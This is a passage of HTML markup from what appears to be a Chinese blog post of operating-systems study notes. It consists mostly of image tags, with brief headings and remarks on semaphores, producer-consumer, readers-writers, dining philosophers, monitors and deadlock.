srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627102317489" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627102641186.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627102641186.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627102641186" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627102727655.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627102727655.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627102727655" style="zoom:50%;"><h2 id="信号量机制"><a href="#信号量机制" class="headerlink" title="信号量机制"></a>信号量机制</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104402838.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104402838.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627104402838"></p><h6 id="1-整型信号量"><a href="#1-整型信号量" class="headerlink" title="1.整型信号量"></a>1.整型信号量</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627103332895.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627103332895.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627103332895" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627103541298.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627103541298.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627103541298" style="zoom:50%;"><h6 id="2-记录型信号量"><a href="#2-记录型信号量" class="headerlink" title="2.记录型信号量"></a>2.记录型信号量</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627103656521.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627103656521.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627103656521" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104040008.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104040008.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627104040008" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104337299.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104337299.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627104337299" style="zoom:50%;"><h2 id="信号量机制实现进程互斥"><a href="#信号量机制实现进程互斥" class="headerlink" title="信号量机制实现进程互斥"></a>信号量机制实现进程互斥</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627105642725.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627105642725.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627105642725" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104930204.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627104930204.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627104930204" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627105239137.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627105239137.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627105239137" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627105401025.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627105401025.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627105401025" style="zoom:50%;"><h2 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h2><p>主要是两个同步问题和一个互斥问题</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627110703349.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627110703349.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627110703349" style="zoom:67%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627110807791.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627110807791.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627110807791" style="zoom:67%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627110936845.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627110936845.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627110936845" style="zoom:50%;"><h2 id="多生产者和多消费者问题"><a href="#多生产者和多消费者问题" class="headerlink" title="多生产者和多消费者问题"></a>多生产者和多消费者问题</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627111643279.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627111643279.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627111643279"></p><p>缓冲区大小为1，所以不需要互斥访问</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627133317302.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627133317302.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627133317302" style="zoom:67%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627133430266.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627133430266.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627133430266" style="zoom:67%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627133606438.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627133606438.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627133606438" style="zoom:50%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627134319153.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627134319153.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627134319153"></p><h2 id="读者和写者问题"><a href="#读者和写者问题" class="headerlink" title="读者和写者问题"></a>读者和写者问题</h2><p>一个写者写文件和多个读者读文件</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627135703621.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627135703621.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627135703621" style="zoom:50%;"><p><strong>第一个读者</strong>对文件进行加锁，if(count==0)的时候对P(rw)进行加锁，其他读者进来时可以直接跳过P(rw)，而信号量mutex则是为了保证变量count的互斥访问，防止if(count==0)到P(rw)之间进程调度发生时，两个进程发生了死锁。所以需要PV操作对mutex信号量进行操作，最后一个读进程时则需要对文件进行解锁</p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627140834210.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627140834210.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627140834210"></p><h2 id="哲学家进餐问题"><a href="#哲学家进餐问题" class="headerlink" title="哲学家进餐问题"></a>哲学家进餐问题</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627141246293.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627141246293.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627141246293" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627141940849.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627141940849.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627141940849" style="zoom: 50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627142112705.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627142112705.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627142112705" style="zoom:50%;"><h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><h6 id="1-管程的定义和基本特征"><a href="#1-管程的定义和基本特征" class="headerlink" title="1.管程的定义和基本特征"></a>1.管程的定义和基本特征</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627143103498.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627143103498.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627143103498" style="zoom:50%;"><h6 id="2-用管程解决生产者和消费者问题"><a href="#2-用管程解决生产者和消费者问题" class="headerlink" title="2.用管程解决生产者和消费者问题"></a>2.用管程解决生产者和消费者问题</h6><h6 id="3-JAVA中类似的管程机制"><a href="#3-JAVA中类似的管程机制" class="headerlink" title="3.JAVA中类似的管程机制"></a>3.JAVA中类似的管程机制</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627144458576.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627144458576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627144458576" style="zoom:50%;"><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627144834299.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627144834299.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627144834299" style="zoom:67%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627145200930.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627145200930.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627145200930" style="zoom:67%;"><p><strong>循环等待不一定导致死锁，死锁一定会导致循环等待</strong></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627145436034.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627145436034.png" 